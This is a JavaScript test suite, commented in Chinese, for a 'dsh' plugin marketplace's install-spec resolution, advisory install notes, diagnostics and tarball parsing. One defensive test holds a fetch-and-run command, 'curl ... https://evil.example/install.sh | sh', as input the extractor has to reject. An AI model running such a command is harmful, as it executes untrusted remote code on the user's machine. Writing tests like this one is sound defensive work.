/**
 * 安装规格与提示测试 —— 0.6.0 起本插件的核心约定。
 *
 * ★ 这里以前测的是「装前闸门」（gate）的三类判定：放行 / 可覆盖拦截 / 硬拦截。
 *   闸门已经整体删除，所以这组测试换了目标 —— 它现在钉住的是**新的核心约定**：
 *
 *     · 市场**不判定任何插件能不能装**：所有条目都要能解析出一条路（自动或手动）
 *     · 「怎么装」由配置文件 + 探测证据决定，规格来源必须如实标注
 *     · 我们知道的**事实**（没声明 dsh.bundle、peer pin 到更新的版本、
 *       与已装的冲突…）以 `notes` 形式说出来 —— 是提示，不是判决
 *
 * 另外保留两件自己实现的工具的测试：干净命令提取、tar 只读访问。
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { suite, test, assert, eq, REPO_ROOT as REPO, importBuilt, ensureTestProfile } from './harness.mjs';

// 针对**打包产物**测试（见 harness.mjs 顶部说明）：源码树与打包布局的相对深度不同，
// 只测源码会漏掉 cwd / 包内资源解析错位这一类问题。
const { resolveInstallSpec, explainNoAutoInstall, installNotes, extractCleanSpec, readPackageFromTarball } =
  await importBuilt('lib/spec.js');
const { checkEnvironment, checkProfile } = await importBuilt('lib/diagnose.js');
const { detectEnvironment, readJsonSafe, compareVersions } = await importBuilt('lib/util.js');
const { readProfileState, scanInstalled, composedTree, resolveRuntimePackageVersion } = await importBuilt('lib/profile.js');
const { loadCatalogIndex, normalizeEntry } = await importBuilt('lib/catalog.js');

// 测试针对**隔离环境**跑，绝不碰生产 profile
const DEV_HOME = process.env.DPM_TEST_HOME ?? path.join(os.homedir(), '.dsh-dev');
process.env.DSH_HOME = DEV_HOME;

// ★ 隔离 profile 读不到就铺一份最小 fixture。
//   安装规格的解析要在一个「已初始化的 profile」上做，而 CI 上没有 dsh、
//   没人替我们建它 —— 不铺的话这组测试会在 CI 里恒红、开发机上恒绿，
//   很快就会被当成噪音。已存在的 profile 一个字节都不动。
const fixture = ensureTestProfile({ home: DEV_HOME });
if (fixture.created) console.log(`  （隔离 profile 不存在，已铺最小 fixture：${fixture.dir}）`);

const compat = readJsonSafe(path.join(REPO, 'compatibility.json'));
// ★ preferRemote:false —— 这组测试要的是「给定一份目录，解析得对不对」，
// 不该依赖网络、也不该被上游目录此刻的内容左右。用包内那份，测试才是可复现的。
const bundled = await loadCatalogIndex({ preferRemote: false });

/** 迷你 tar.gz 写入器：只为造一个可控的候选包 */
function makeTgz(files) {
  const blocks = [];
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.from(content, 'utf8');
    const header = Buffer.alloc(512);
    header.write(name, 0, 100, 'utf8');
    header.write('0000644\0', 100, 8);
    header.write('0000000\0', 108, 8);
    header.write('0000000\0', 116, 8);
    header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124, 12);
    header.write(`${Math.floor(Date.now() / 1000).toString(8).padStart(11, '0')}\0`, 136, 12);
    header.write('        ', 148, 8);
    header.write('0', 156, 1);
    header.write('ustar\0', 257, 6);
    header.write('00', 263, 2);
    let sum = 0;
    for (const b of header) sum += b;
    header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8);
    blocks.push(header, data);
    const pad = (512 - (data.length % 512)) % 512;
    if (pad) blocks.push(Buffer.alloc(pad));
  }
  blocks.push(Buffer.alloc(1024));
  return zlib.gzipSync(Buffer.concat(blocks), { level: 9 });
}

function buildCtx() {
  const env = detectEnvironment(process.env);
  const profile = compat?.profile ?? 'web';
  return {
    env,
    compat,
    profileState: readProfileState(profile, process.env),
    installed: scanInstalled(profile, process.env),
    // 不传 launcher：让 composedTree 自己解析「怎么调 dsh」（优先 lib/bin.js）。
    tree: composedTree(profile, process.env),
    repoRoot: REPO,
    repoRawBase: 'https://raw.githubusercontent.com/HaydenSmith1121/dsh-plugins/main',
    runtimeVersions: {
      '@deepseek-ai/dsh-llm': resolveRuntimePackageVersion('@deepseek-ai/dsh-llm', { dshDir: env.dsh.dir, env: process.env }).version ?? null,
      '@deepseek-ai/dsh-session': resolveRuntimePackageVersion('@deepseek-ai/dsh-session', { dshDir: env.dsh.dir, env: process.env }).version ?? null,
      '@deepseek-ai/dsh-tools': resolveRuntimePackageVersion('@deepseek-ai/dsh-tools', { dshDir: env.dsh.dir, env: process.env }).version ?? null,
      cordis: resolveRuntimePackageVersion('cordis', { dshDir: env.dsh.dir, env: process.env }).version ?? null,
    },
  };
}

// ─────────────────────────────────────────────────────────────
// 前置：被测环境本身长什么样
// ─────────────────────────────────────────────────────────────

suite('spec / 前置');

test('隔离环境存在且 profile 已初始化（测试前置）', () => {
  assert(fs.existsSync(DEV_HOME), `测试前置：找不到隔离环境 ${DEV_HOME}`);
  const state = readProfileState(compat.profile ?? 'web', process.env);
  assert(state.initialized, '隔离 profile 应当已初始化');
  assert(state.bundles.length >= 2, '应当至少有内置的两个 bundle');
});

test('★ 本机装了真实的 dsh（测试前置）', () => {
  // ★ 这一条单独写出来，是因为少了它，下面的失败会**指向错误的地方**。
  //   环境层第一件事是「找到 @deepseek-ai/dsh 的安装目录」，找不到就整组 FATAL ——
  //   于是「环境诊断」看起来像坏了。实测过一次：CI 上没有任何全局安装，
  //   环境检查全红，报的却是插件名。错的是「拿一个空容器当被测环境」。
  const env0 = detectEnvironment(process.env);
  assert(env0.dsh.installed,
    '测试前置：本机找不到 @deepseek-ai/dsh 的安装目录。\n'
    + '    提示里要拿真实安装里的版本当基准（含 @deepseek-ai/dsh-llm 的版本），没有它整组测试无意义。\n'
    + `    修复：npm i -g @deepseek-ai/dsh@${compat?.runtimes?.find((r) => r.status === 'supported')?.dshVersion ?? '0.1.6-alpha.1'} pnpm@10`);
  assert(env0.pnpm.installed,
    '测试前置：PATH 上找不到 pnpm —— dsh plugin 本质是 pnpm 的薄封装。\n'
    + '    修复：npm i -g pnpm@10（装在与 dsh 同一个 Node 前缀下）');
  assert(
    resolveRuntimePackageVersion('@deepseek-ai/dsh-llm', { dshDir: env0.dsh.dir, env: process.env }).version,
    '测试前置：解析不出 @deepseek-ai/dsh-llm 的版本 —— peer pin 提示会退化成「无法判定」。',
  );
});

// ─────────────────────────────────────────────────────────────
// ★ 核心约定：市场不判定任何插件能不能装
// ─────────────────────────────────────────────────────────────

suite('spec / ★ 不判定「能不能装」');

test('★ 包内兜底目录的每一条都能解析出安装规格（没有一条是「不能装」）', async () => {
  // 这钉住的是 0.6.0 最核心的那条约定：**所有插件都可装**。
  // 以前这里有「硬拦截」「默认拦截」两档结论，现在一条都不该再有 ——
  // 解析结果只有两种：能自动执行（spec 非 null），或退回手动（spec 为 null 但
  // 仍然给得出上游说明）。两种都不是「禁止安装」。
  const { loadPluginConfig, entryFromConfig } = await importBuilt('lib/catalog.js');
  const ctx = buildCtx();
  assert(bundled.available, `包内目录不可用：${bundled.error}`);
  assert(bundled.entries.length > 0, '包内兜底目录不能是空的');

  for (const indexEntry of bundled.entries) {
    const { config, error } = await loadPluginConfig(indexEntry);
    assert(config, `${indexEntry.slug}: 读不到配置文件（${error ?? ''}）`);
    const entry = entryFromConfig(config, indexEntry);

    const spec = resolveInstallSpec(entry, ctx, null);
    assert(spec, `${entry.id} 应当能解析出自动安装规格（本仓库托管 tarball 的条目一律可自动装）`);
    eq(spec.kind, 'local-tarball', `${entry.id} 的规格类型应当是 local-tarball`);
    assert(spec.spec, `${entry.id} 的规格不能是空字符串`);
    // 「来源」必须如实标注，界面靠它告诉用户这份「怎么装」是从哪儿来的
    assert(['local', 'repo', 'remote'].includes(spec.source), `${entry.id} 的来源标注不合法：${spec.source}`);
    eq(entry.install.method, 'tarball', `${entry.id} 出现在包内兜底目录里，安装方法就必须是 tarball`);
    eq(entry.tier, undefined, `${entry.id} 不该再有 tier 字段 —— 信任分级已在 0.5.0 移除`);
  }
});

test('★ 曾经被硬拦截的形态，现在照样给得出安装规格', () => {
  // 这些正是旧闸门会算出 verdict=block 的形态。它们现在**一个都不能**影响规格解析：
  // 「装不装」不再由市场判断，只有「怎么装」需要解析。
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-spec-'));
  const cases = [
    ['wants-newer', { dsh: { bundle: { patch: './cordis.patch.yml' } }, peerDependencies: { '@deepseek-ai/dsh-llm': '99.0.0' } }],
    ['no-bundle', {}],
    ['no-patch', { dsh: { bundle: { patch: './cordis.patch.yml' } } }],
  ];
  for (const [name, extra] of cases) {
    const tgz = path.join(tmp, `${name}-1.0.0.tgz`);
    fs.writeFileSync(tgz, makeTgz({
      'package/package.json': JSON.stringify({
        name, version: '1.0.0', type: 'module', main: 'lib/index.js',
        exports: { '.': { default: './lib/index.js' } }, ...extra,
      }, null, 2),
      'package/lib/index.js': `export const name = "${name}";\n`,
    }));
    const entry = normalizeEntry({
      id: name, package: name, version: '1.0.0',
      install: { method: 'tarball', kind: 'local-tarball', spec: tgz, tarball: tgz },
    });
    const spec = resolveInstallSpec(entry, buildCtx(), null);
    assert(spec, `${name} 应当仍然解析出安装规格 —— 这些形态不再拦任何东西`);
    eq(spec.spec, tgz, `${name} 的规格应当是那个本地 tarball`);
  }
  fs.rmSync(tmp, { recursive: true, force: true });
});

test('★ 没有可自动执行的路径 ≠ 禁止安装：explainNoAutoInstall 给得出说明', async () => {
  for (const method of ['manual', 'skills']) {
    const entry = normalizeEntry({ id: `mystery/${method}`, name: 'thing', install: { method, commands: [] } });
    eq(resolveInstallSpec(entry, buildCtx(), null), null, `${method} 没有可自动执行的路径`);
    const why = explainNoAutoInstall(entry);
    assert(why && why.length > 10, `${method} 必须给得出「为什么没有自动方式」的说明`);
    assert(!/不允许|禁止|拦截/.test(why), `★ 说明里不能出现「不允许 / 禁止」这类判决措辞：${why}`);
  }
  // skills 形态要说清是「上游走 skills 机制」，而不是含糊地说「不支持」
  assert(/skills/.test(explainNoAutoInstall(normalizeEntry({ id: 'a/b', install: { method: 'skills' } }))),
    'skills 形态的说明要点明是上游 skills 机制');
});

test('★ 诊断（环境 / profile）不产出任何放行结论', () => {
  // checkEnvironment / checkProfile 保留下来只为了「已装」页的体检 ——
  // 它们描述「这台机器哪儿不对」，不描述「这个插件能不能装」。
  // 所以返回值里绝不能出现 canInstall / verdict 这类字段：一旦出现，
  // 就说明有人又把裁决权搬回来了。
  const ctx = buildCtx();
  const checks = [...checkEnvironment(ctx), ...checkProfile(ctx)];
  assert(checks.length > 0, '应当至少产出一条诊断结论');
  for (const c of checks) {
    assert(c.id && c.title && c.severity && c.status, `诊断项字段要完整：${JSON.stringify(c)}`);
    eq(c.canInstall, undefined, `${c.id} 不该带 canInstall —— 诊断不参与放行`);
    eq(c.verdict, undefined, `${c.id} 不该带 verdict`);
    assert(c.id.startsWith('env.') || c.id.startsWith('profile.'), `${c.id} 应当属于环境层或 profile 层`);
  }
  const env0 = detectEnvironment(process.env);
  if (env0.dsh.installed && env0.pnpm.installed) {
    const hard = checks.filter((c) => c.status === 'fail' && c.severity === 'fatal');
    assert(hard.length === 0,
      `本机环境应当是健康的，却报出致命项：${hard.map((c) => `${c.id}(${c.detail})`).join(' / ')}`);
  }
});

test('★ 隔离 profile 上跑一遍诊断：全部字段齐、且悬空依赖会被如实报出', () => {
  const ctx = buildCtx();
  const profileChecks = checkProfile(ctx);
  const ids = profileChecks.map((c) => c.id);
  assert(ids.includes('profile.file-specs'), '应当检查 file: 依赖完整性（这是「装什么都失败」的最常见根因）');
  assert(ids.includes('profile.workspace'), '应当检查 pnpm-workspace.yaml 的三个不变量');
  assert(ids.includes('profile.allowbuilds'), '应当检查 allowBuilds');
  const dangling = profileChecks.find((c) => c.id === 'profile.file-specs');
  eq(dangling.status, 'pass', `隔离 fixture 里不该有悬空 file: 依赖：${dangling.detail}`);
});

// ─────────────────────────────────────────────────────────────
// 规格解析：来源必须如实标注
// ─────────────────────────────────────────────────────────────

suite('spec / 规格解析与来源');

test('配置文件里的方法逐一解析，来源如实标注', () => {
  const ctx = buildCtx();

  eq(resolveInstallSpec(normalizeEntry({ id: 'a/b', package: 'b', install: { method: 'github', spec: 'github:o/r' } }), ctx, null),
    { kind: 'github', spec: 'github:o/r', resolvedPath: null, package: 'b', source: 'config' });

  eq(resolveInstallSpec(normalizeEntry({ id: 'a/c', package: 'c', install: { method: 'npm', spec: 'dsh-workbuddy-connect' } }), ctx, null),
    { kind: 'npm', spec: 'dsh-workbuddy-connect', resolvedPath: null, package: 'c', source: 'config' });
});

test('★ 从 owner/repo 推导 github 规格（pnpm 直接解析仓库，不会张冠李戴）', () => {
  const spec = resolveInstallSpec(normalizeEntry({
    id: 'someone/cool-plugin', package: 'cool-plugin',
    upstream: 'https://github.com/someone/cool-plugin',
    install: { method: 'manual', commands: [] },
  }), buildCtx(), null);
  eq(spec?.kind, 'github');
  eq(spec?.spec, 'github:someone/cool-plugin');
  eq(spec?.source, 'derived-github', '★ 推导出来的规格必须标注成 derived-github，不能冒充配置文件');
});

test('★ 没有探测证据时绝不拿显示名当 npm 包名', () => {
  // 公共索引里的 name 与真实 npm 包名没有任何保证关系。直接拿来装，
  // 极可能装进来一个同名但完全无关的包 —— 那是最难排查的一类事故。
  const entry = normalizeEntry({
    id: 'someone/thing', package: 'thing', name: 'thing',
    upstream: 'https://gitlab.com/other/thing',
    install: { method: 'manual', commands: [] },
  });
  eq(resolveInstallSpec(entry, buildCtx(), null), null, '没有探测证据时应当返回 null，而不是裸包名');

  // 有探测证据（npm registry）时才可以退到包名
  const probed = { available: true, source: 'npm registry (registry.npmjs.org)', manifest: { name: 'thing' } };
  const spec = resolveInstallSpec(entry, buildCtx(), probed);
  eq(spec?.kind, 'npm');
  eq(spec?.spec, 'thing');
  eq(spec?.source, 'probed-npm', '探测来的规格要标注成 probed-npm');
});

test('存在悬空 file: 依赖时**不改**规格解析结果（诊断归诊断）', () => {
  // 旧闸门在这时会拦下安装。现在规格解析必须完全不受影响 ——
  // 悬空依赖是 profile 的问题，由「体检」如实报出，改的是 preflight，
  // 与「这个插件怎么装」是两件事。混在一起正是旧设计最容易搞错的地方。
  const ctx = buildCtx();
  ctx.profileState = {
    ...ctx.profileState,
    dependencies: { ...(ctx.profileState.dependencies ?? {}), 'dangling-pkg': 'file:./no-such-file-9.9.9.tgz' },
  };
  const spec = resolveInstallSpec(normalizeEntry({
    id: 'someone/x', package: 'x', install: { method: 'github', spec: 'github:o/x' },
  }), ctx, null);
  eq(spec?.spec, 'github:o/x', '★ 规格解析不该被 profile 的问题左右');

  const dangling = checkProfile(ctx).find((c) => c.id === 'profile.file-specs');
  eq(dangling.status, 'fail', '但诊断必须如实报出这个悬空依赖');
});

// ─────────────────────────────────────────────────────────────
// notes：我们知道的**事实**（提示，不是判决）
// ─────────────────────────────────────────────────────────────

suite('spec / 装前提示');

test('没有声明 dsh.bundle → 说得清清楚楚（但不禁装）', () => {
  const notes = installNotes(
    normalizeEntry({ id: 'a/plain', package: 'plain', install: { method: 'tarball' } }),
    { probe: { available: true, manifest: { name: 'plain', version: '1.0.0' } } },
  );
  const n = notes.find((x) => x.id === 'no-bundle');
  assert(n, '应当提示「装了但 GUI 里不会有」');
  assert(/dsh\.profile\.bundles/.test(n.text), '要说清机制：不会写进 dsh.profile.bundles');
  assert(/不会|没有/.test(n.text), '要说清结果：装上了但 GUI 里没有');
});

test('声明了 patch 却不在包里 → 提示启动会失败', () => {
  const notes = installNotes(
    normalizeEntry({ id: 'a/np', package: 'np', install: { method: 'tarball' } }),
    { probe: { available: true, manifest: { name: 'np', dsh: { bundle: { patch: './cordis.patch.yml' } } }, patchFilesMissing: ['./cordis.patch.yml'] } },
  );
  assert(notes.some((x) => x.id === 'patch-missing'), '应当提示 patch 文件缺失');
});

test('★ peer pin 到**更高**版本 → 提示（不再是硬拦截）', () => {
  // 实测过的事故形态：@deepseek-ai/dsh-llm 被精确 pin 到 0.1.6-alpha.1，
  // 在 0.1.5 线上装 → 内置 dsh-llm 缺那个导出 → 整棵树加载失败。
  // 事实没变，但现在它只是**一句提示** —— 要不要冒这个险由用户决定。
  const ctx = buildCtx();
  const real = ctx.runtimeVersions['@deepseek-ai/dsh-llm'];
  assert(real, '测试前置：应当能解析出本机 @deepseek-ai/dsh-llm 的版本');
  assert(compareVersions(real, '99.0.0') < 0, `测试前置：本机 ${real} 应低于 99.0.0`);

  const notes = installNotes(
    normalizeEntry({ id: 'a/nw', package: 'nw', install: { method: 'tarball' } }),
    {
      probe: { available: true, manifest: { name: 'nw', peerDependencies: { '@deepseek-ai/dsh-llm': '99.0.0' } } },
      runtimeVersions: ctx.runtimeVersions,
    },
  );
  const n = notes.find((x) => x.id === 'peer-newer');
  assert(n, '应当提示 peer pin 高于本机');
  assert(n.text.includes('99.0.0') && n.text.includes(real), '提示里要同时给出「要什么」和「本机是什么」');
  assert(!/不允许|拦截/.test(n.text), `★ 提示里不能出现判决措辞：${n.text}`);
});

test('★ peer pin 到**更低**版本 → 不提示（向后兼容的常见写法，提了就是噪音）', () => {
  const notes = installNotes(
    normalizeEntry({ id: 'a/wo', package: 'wo', install: { method: 'tarball' } }),
    {
      probe: { available: true, manifest: { name: 'wo', peerDependencies: { '@deepseek-ai/dsh-llm': '0.0.1' } } },
      runtimeVersions: buildCtx().runtimeVersions,
    },
  );
  eq(notes.find((x) => x.id === 'peer-newer'), undefined, 'pin 到更低版本不该产生提示');
});

test('范围声明（^ / ~）不是 pin，不产生提示', () => {
  const notes = installNotes(
    normalizeEntry({ id: 'a/rng', package: 'rng', install: { method: 'tarball' } }),
    {
      probe: { available: true, manifest: { name: 'rng', peerDependencies: { '@deepseek-ai/dsh-llm': '^99.0.0' } } },
      runtimeVersions: buildCtx().runtimeVersions,
    },
  );
  eq(notes.find((x) => x.id === 'peer-newer'), undefined, '范围声明允许漂移，不该当成 pin');
});

test('已知共存冲突：本机已装对家时才提示', () => {
  const entry = normalizeEntry({ id: 'a/go', package: 'dsh-opencode-go', install: { method: 'github', spec: 'github:o/go' } });
  const plain = installNotes(entry, { installed: [] });
  eq(plain.find((x) => x.id === 'coexistence'), undefined, '没装对家时不该提示');

  const conflict = installNotes(entry, { installed: [{ name: 'dsh-opencode-go-plus', installed: true }] });
  const n = conflict.find((x) => x.id === 'coexistence');
  assert(n, '已装对家时应当提示不能共存');
  assert(/不能共存/.test(n.text), '要说清是「不能共存」，而不是含糊的「可能有问题」');
});

test('needsConfig / 安装脚本 / 配置自带的共存警告都会被说出来', () => {
  const notes = installNotes(
    normalizeEntry({
      id: 'a/cfg', package: 'cfg',
      coexistenceWarning: '与 X 插件共用同一份配置目录。',
      install: { method: 'github', spec: 'github:o/cfg', needsConfig: true, risky: true },
    }),
    { installed: [] },
  );
  const ids = notes.map((x) => x.id);
  assert(ids.includes('needs-config'), '应当提示装完要配置');
  assert(ids.includes('coexistence-config'), '应当带出配置里自己声明的共存警告');
  assert(ids.includes('install-scripts'), '应当提示上游带安装期脚本');
  assert(notes.find((x) => x.id === 'install-scripts').text.includes('pnpm 10'),
    '安装脚本提示要说清「pnpm 10+ 默认拦截，本市场不会替你放行」');
});

// ─────────────────────────────────────────────────────────────
// 自己实现的工具
// ─────────────────────────────────────────────────────────────

suite('spec / 干净命令提取');

test('★ extractCleanSpec 拒绝非插件类命令', () => {
  // 公共索引里真实存在的这些形态一个都不能被当成安装命令执行
  eq(extractCleanSpec(['curl -fsSL https://evil.example/install.sh | sh']), null);
  eq(extractCleanSpec(['pip install manim']), null);
  eq(extractCleanSpec(['brew install --cask something']), null);
  eq(extractCleanSpec(['npm install -g dsh-github-intelligence']), null);
  eq(extractCleanSpec(['git clone https://github.com/a/b.git && cd b']), null);
  eq(extractCleanSpec(['dsh plugin --profile web add <npm pack 产物 tarball 路径>']), null, '含占位符的命令不可信');
  eq(extractCleanSpec(['dsh plugin --profile web exec something login']), null);
  eq(extractCleanSpec([]), null);
  eq(extractCleanSpec(undefined), null);
});

test('extractCleanSpec 接受干净的 npm / github 规格', () => {
  eq(extractCleanSpec(['dsh plugin --profile web add github:foo/bar']), { kind: 'github', spec: 'github:foo/bar' });
  eq(extractCleanSpec(['dsh plugin --profile web add dsh-workbuddy-connect']), { kind: 'npm', spec: 'dsh-workbuddy-connect' });
  eq(extractCleanSpec(['dsh plugin --profile web add @scope/pkg@1.2.3']), { kind: 'npm', spec: '@scope/pkg@1.2.3' });
  // 多命令里第一个不可信时，应继续往后找
  eq(
    extractCleanSpec(['git clone https://github.com/a/b.git', 'dsh plugin --profile web add github:a/b']),
    { kind: 'github', spec: 'github:a/b' },
  );
});

test('readPackageFromTarball 对损坏输入的降级', () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'dpm-spec-'));
  const bad = path.join(tmp, 'bad.tgz');
  fs.writeFileSync(bad, Buffer.from('this is not a gzip'));
  const r = readPackageFromTarball(bad);
  eq(r.manifest, null);
  assert(r.error, '应当给出可读的错误原因，而不是抛异常');

  // 正常的 tarball 要读得出来（安装规格里的 sha256 / package.json 都靠这条路径）
  const good = path.join(tmp, 'good-1.0.0.tgz');
  fs.writeFileSync(good, makeTgz({
    'package/package.json': JSON.stringify({ name: 'good', version: '1.0.0', dsh: { bundle: { patch: './cordis.patch.yml' } } }, null, 2),
  }));
  const g = readPackageFromTarball(good);
  eq(g.manifest?.name, 'good');
  eq(g.manifest?.version, '1.0.0');
  fs.rmSync(tmp, { recursive: true, force: true });
});
